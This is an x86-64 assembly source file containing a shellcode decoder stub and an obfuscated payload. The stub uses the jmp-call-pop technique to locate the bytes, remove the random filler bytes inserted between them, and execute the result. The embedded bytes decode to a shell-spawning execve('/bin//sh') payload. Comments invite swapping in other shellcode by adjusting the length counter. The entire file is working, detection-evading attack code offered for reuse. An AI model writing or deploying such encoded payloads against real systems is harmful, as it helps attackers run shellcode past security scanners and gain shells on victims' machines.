section .text
global _start
_start:
        jmp short end ; jmp pop call
 
decoder:
 
        ; clean up the registers           

        pop rsi         ; get addr of shellcode putted by call starter
        push rsi        ; backup for call :D
 
        mov rdx, rsi    ; mov shellcode start addr to esi (source)
        mov rdi, rsi    ; mov shellcode start addr to edi (destination)
        inc rsi         ; point to the first dest byte, how many bytes we need to remove/espace
        inc rdi         ; point to the first random number
        
        push byte 0x53
        pop rcx ;83 - loop counter/your shellcode length, if you use diferent shellcode need adjust it
 
restore:
        xor rax, rax ;eax
        xor rbx, rbx ;ebx
 
        mov al, byte [rdi]  ; read distance to next byte
        add rax, rdi        ; eax = addr of the next valid byte
 
        mov bl, byte [rax]  ; bl = next valid byte of the shellcode
        mov byte [rdx], bl  ; move it to the final position
 
        mov rdi, rax        ; put latest valid pisition into edi 
        inc rdi             ; next distance
        inc rdx             ; next valid byte
 
        loop restore        ; loop
        
        pop rsi             ; call shellcode
        call rsi                       
 
end:
        call decoder  ; put shellcode addr into stack
        shelcode: db  0x48,0x01,0x31,0x01,0xc0,0x01,0x50,0x03,0x69,0x5b,0x48,0x01,0xbb,0x03,0x7a,0x4d,0x2f,0x03,0x60,0x49,0x62,0x01,0x69,0x01,0x6e,0x01,0x2f,0x02,0x58,0x2f,0x02,0x76,0x73,0x02,0x7a,0x68,0x01,0x53,0x03,0x71,0x62,0x48,0x01,0x89,0x02,0x7a,0xe7,0x01,0x50,0x03,0x6d,0x51,0x48,0x02,0x42,0x89,0x01,0xe2,0x02,0x51,0x57,0x03,0x71,0x59,0x48,0x02,0x54,0x89,0x01,0xe6,0x03,0x46,0x6c,0xb0,0x03,0x4b,0x61,0x3b,0x01,0x0f,0x02,0x71,0x05,0x01